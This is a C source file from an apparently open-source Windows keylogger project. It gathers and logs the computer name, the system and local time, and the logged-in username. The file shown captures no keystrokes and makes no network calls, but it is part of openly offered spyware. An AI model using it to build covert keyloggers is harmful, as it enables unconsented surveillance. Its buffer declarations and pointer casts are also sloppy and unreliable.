/* This file is part of bb-keylogger project.
*
* See the NOTICE file distributed with this work for copyright information.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/

/*
* File:   bb-keylogger-system.c
* Author: Frapin Kevin
* Date:   31/03/2011
*
* DESCRIPTION
* -----------------------------------------------------------------------------
* File containing all the functions used to retrieve and log informations about
* the system.
* -----------------------------------------------------------------------------
*/

//---------------------------------------------------------------------- DEFINE
#define _WIN32_WINNT 0x0601

//------------------------------------------------------------- SYSTEM INCLUDES
#include <windows.h>

//---------------------------------------------------------- PERSONNAL INCLUDES
#include "includes/bb-keylogger-globals.h"
#include "includes/bb-keylogger-system.h"
#include "includes/bb-keylogger-utils.h"

//------------------------------------------------------------------- FUNCTIONS
/*
* Function that log informations about the system :
*  - call log_computer_infos
*  - call log_user_infos
*/
void log_system_infos( FILE * log_file )
{
	log_computer_infos( log_file );
	log_user_infos( log_file );
}

/*
* Function that log informations about the computer :
*  - log the computer name
*  - log the system time
*  - log the local time
*/
void log_computer_infos( FILE * log_file )
{
	// Get infos : computer name, system time, local time
	int buffer_size = BUFFER_SIZE_STR;
	char * computer_name [ buffer_size ];
	SYSTEMTIME system_time, local_time;

	GetComputerName( ( LPTSTR ) computer_name, ( LPDWORD ) &buffer_size );
	GetSystemTime( ( LPSYSTEMTIME ) &system_time );
	GetLocalTime( ( LPSYSTEMTIME ) &local_time );
	
	// Log these infos
	log_infos( log_file, "# Computer name : %s\n", computer_name );
			
	log_infos( log_file,
			"# System time : %02d/%02d/%04d - %02d:%02d\n", 
			system_time.wDay, system_time.wMonth, system_time.wYear, 
			system_time.wHour, system_time.wMinute );	
	
	log_infos( log_file, 
			"# Local time : %02d/%02d/%04d - %02d:%02d\n", 
			local_time.wDay, local_time.wMonth, local_time.wYear, 
			local_time.wHour, local_time.wMinute );
}

/*
* Function that log informations about the logged user :
*  - log the username
*/
void log_user_infos( FILE * log_file )
{
	// Get infos : username
	int buffer_size = BUFFER_SIZE_STR;
	char * username [ buffer_size ];
	GetUserName( ( LPTSTR ) username, ( LPDWORD ) &buffer_size );
	
	// Log these infos
	log_infos( log_file, "# Logged user : %s\n", username );
}